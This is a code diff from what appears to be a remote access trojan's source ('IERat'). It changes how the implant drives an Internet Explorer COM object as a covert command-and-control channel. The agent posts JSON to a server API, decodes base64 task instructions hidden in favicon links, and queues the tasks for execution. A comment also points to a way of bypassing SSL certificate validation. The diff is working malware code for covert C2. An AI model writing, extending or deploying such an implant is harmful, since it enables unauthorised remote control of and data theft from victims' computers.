@@ -10,6 +10,7 @@ using System.Web.Script.Serialization;
 using IERat.lib.Actions;
 using System.Reflection;
 using System.Collections.Generic;
+using System.Windows.Forms;
 
 namespace IERat.lib
 {
@@ -19,20 +20,22 @@ namespace IERat.lib
         {
             Status = "Connecting";
             Agent = new Agent();
+            InternetExplorer = new InternetExplorerClass();
         }
         public string Status { get; set; }
         public bool IEvisible { get; set; }
+        //WebBrowser WebBrowser { get; set; }
         public Agent Agent { get; set; }
-
-        static InternetExplorer IE_handler = null;
+        InternetExplorer InternetExplorer { get; set; }
         public string CurrentRequest { get; set; }
         public string BaseURL { get; set; }
         public int SleepTime { get; set; }
         void DocumentComplete(object pDisp, ref object URL)
+        //void OnDocumentComplete(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
-            if (IE_handler.LocationURL.Contains(this.BaseURL))
+            if (InternetExplorer.LocationURL.Contains(this.BaseURL))
             {
-                HTMLDocument DOM = (HTMLDocument)IE_handler.Document;
+                HTMLDocument DOM = (HTMLDocument)InternetExplorer.Document;
                 var Links = DOM.getElementsByTagName("link");
                 try
                 {
@@ -53,17 +56,17 @@ namespace IERat.lib
         }
         public void Open()
         {
-            IE_handler = new InternetExplorer { Visible = IEvisible };
-            IE_handler.DocumentComplete += new DWebBrowserEvents2_DocumentCompleteEventHandler(DocumentComplete);
+            InternetExplorer.DocumentComplete += new DWebBrowserEvents2_DocumentCompleteEventHandler(DocumentComplete);
+            //WebBrowser = new SHDocVw.WebBrowser();
+            //WebBrowser.DocumentComplete += OnDocumentComplete;
             Thread thread = new Thread(new ThreadStart(Start));
             thread.Start();
             Thread ExecuteAgentTasksThread = new Thread(new ThreadStart(ExecuteAgentTasks));
             ExecuteAgentTasksThread.Start();
         }
-
         public void Close()
         {
-            IE_handler.Quit();
+            InternetExplorer.Quit();
             this.Status = "Killed";
         }
         public void Start()
@@ -94,7 +97,7 @@ namespace IERat.lib
 
                     object PostData = ASCIIEncoding.ASCII.GetBytes(output);
                     string URL = BaseURL + "/api/v1/" + EndPoint;
-                    IE_handler.Navigate(URL, Type.Missing, Type.Missing, ref PostData, "Content-Type: application/json; charset=utf-8");
+                    InternetExplorer.Navigate(URL, Type.Missing, Type.Missing, ref PostData, "Content-Type: application/json; charset=utf-8");
 
                     // to bypass ssl certificate validation use:
                     // https://www.fl0re.com/2019/11/06/powershell-internet-explorer-automation-part-2/
@@ -126,20 +129,23 @@ namespace IERat.lib
                 string ResponseObjectJSON = Utils.Base64Decode(favicon);
                 var js = new JavaScriptSerializer { MaxJsonLength = 2097152 * 3 };
                 ResponseObject responseObject = js.Deserialize<ResponseObject>(ResponseObjectJSON);
-                if (responseObject.Type == "NewAgent")
+                if (responseObject.AgentID == this.Agent.ID)
                 {
-                    if (responseObject.Notes == "Authenticated")
+                    if (responseObject.Type == "NewAgent")
                     {
-                        //Console.WriteLine("Authenticated Successfully");
-                        this.Status = "Connected";
+                        if (responseObject.Notes == "Authenticated")
+                        {
+                            //Debug.WriteLine("Authenticated Successfully");
+                            this.Status = "Connected";
+                        }
                     }
-                }
 
-                else if ((responseObject.Type == "NewTasks") && (responseObject.Tasks.Count != 0))
-                {
-                    var queue = new Queue<TaskObject>(responseObject.Tasks);
-                    while (queue.Count > 0)
-                        this.Agent.AgentTasks.Enqueue(queue.Dequeue());
+                    else if ((responseObject.Type == "NewTasks") && (responseObject.Tasks.Count != 0))
+                    {
+                        var queue = new Queue<TaskObject>(responseObject.Tasks);
+                        while (queue.Count > 0)
+                            this.Agent.AgentTasks.Enqueue(queue.Dequeue());
+                    }
                 }
             }
             catch
